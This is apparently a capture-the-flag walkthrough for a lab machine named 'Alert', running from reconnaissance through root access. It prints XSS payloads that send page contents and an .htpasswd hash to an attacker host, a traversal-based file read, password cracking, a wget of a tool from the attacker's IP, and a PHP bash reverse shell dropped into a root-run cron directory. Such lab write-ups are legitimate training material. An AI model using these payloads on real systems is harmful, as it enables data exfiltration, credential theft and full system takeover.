# Alert

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `N/A` | **Nmap Scan** | Performed initial enumeration using **Nmap** to discover open ports. Identified ports `22` (SSH) and `80` (HTTP) were open. |
| 2 | `N/A` | **Subdomain Enumeration** | Used **`ffuf`** to perform host header fuzzing, which revealed the subdomain `statistics.alert.htb`. |
| 3 | `N/A` | **XSS & LFI Chaining** | Exploited a stored **XSS** vulnerability in the markdown upload feature to exfiltrate the contents of an internal `messages` page. This led to the discovery of a **Local File Inclusion (LFI)** vulnerability via a `file` parameter. |
| 4 | `albert` | **LFI with Directory Traversal** | Used the LFI vulnerability with directory traversal (`../../`) to read the `.htpasswd` file from the `statistics` subdomain. This file contained the hash for the user `albert`. |
| 5 | `albert` | **Hash Cracking & SSH Login** | Used **`john the ripper`** with the `rockyou.txt` wordlist to crack the `albert` hash. Used the recovered password to log in via **SSH** and get the `user.txt` flag. |
| 6 | `root` | **Privilege Escalation** | Enumerated the system and discovered a local service on port `8080`. Also found a writable directory `/opt/Website_Monitor/` where a PHP script was being executed as **root** by a cron job. Created a reverse shell payload in a PHP file and placed it in the directory. |
| 7 | `root` | **Reverse Shell** | Set up a Netcat listener and waited for the cron job to run. The script was executed as `root`, which triggered the reverse shell and granted full administrator privileges, allowing for retrieval of the `root.txt` flag. |

### **1. Initial Reconnaissance** 

First, run an **Nmap** scan to identify open ports and services.

```bash
nmap -sC -sV -T4 -Pn alert.htb
```

This scan reveals two open ports:

  * **Port 22:** SSH
  * **Port 80:** HTTP (Apache web server)

-----

### **2. Gaining a Foothold** 

The website on port 80 allows the upload of markdown files. We'll use a **host header fuzzing** tool to find subdomains.

```bash
ffuf -w /usr/share/wordlists/main.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac
```

This command discovers the **statistics.alert.htb** subdomain.

The core of the initial exploit is a **Cross-Site Scripting (XSS)** vulnerability. We will use a stored XSS payload in a markdown file to exfiltrate the contents of an internal page, `index.php?page=messages`.

Create a markdown file (`payload.md`) with the following content:

```html
<script>
fetch("http://alert.htb/index.php?page=messages")
.then(response => response.text())
.then(data => {
  // Replace <ATTACKER_IP> with your IP address
  fetch("http://<ATTACKER_IP>/?data=" + encodeURIComponent(data));
})
.catch(error => console.error("Error fetching the messages:", error));
</script>
```

Set up a simple Python web server to capture the exfiltrated data:

```bash
python3 -m http.server 80
```

Now, upload the `payload.md` file to the website and copy the sharing link. When the administrator visits the link, your server will receive the HTML content of the `messages` page. Analyzing this content reveals a link with a file parameter: `messages.php?file=...`.

This indicates a **Local File Inclusion (LFI)** vulnerability. We'll use this vulnerability with directory traversal to read the `.htpasswd` file from the **statistics** subdomain.

Create a new markdown file (`lfi_payload.md`) with the following JavaScript payload:

```html
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
.then(response => response.text())
.then(data => {
  // Replace <ATTACKER_IP> with your IP address
  fetch("http://<ATTACKER_IP>:8888/?file_content=" + encodeURIComponent(data));
});
</script>
```

Start a new web server on a different port (e.g., 8888) to receive the hash:

```bash
nc -lvnp 8888
```

Upload this new markdown file and share the link. The hash will be sent to your Netcat listener:

```
albert:$apr1$bXXXXXXXXXXXXXXXXXXXXXXXXXXXXx/
```

Save this hash to a file (e.g., `hash.txt`) and use **John the Ripper** to crack it with the `rockyou.txt` wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt
```

The cracked password allows you to log in via SSH.

```bash
ssh albert@alert.htb
```

-----

### **3. Privilege Escalation** 

Once you have a shell as `albert`, run a comprehensive enumeration script like **LinPEAS** to find a path to root.

```bash
wget http://<ATTACKER_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

The `linpeas.sh` output highlights two key findings:

1.  A service is running locally on **port 8080**.
2.  The `/opt/Website_Monitor/` directory is writable by your user, and a cron job runs PHP files inside it as **root**.

First, forward the local port 8080 to your machine using an **SSH tunnel**.

```bash
ssh -L 8080:127.0.0.1:8080 albert@alert.htb
```

Now, create a PHP reverse shell payload and place it in the vulnerable directory.

```bash
cd /opt/Website_Monitor/
echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/<ATTACKER_IP>/100 0>&1'\''); ?>' > shell.php
```

Set up a Netcat listener on your machine to catch the root shell.

```bash
nc -lvnp 100
```

Wait a few minutes for the cron job to run. The PHP script will execute, sending a reverse shell to your listener, giving you root access.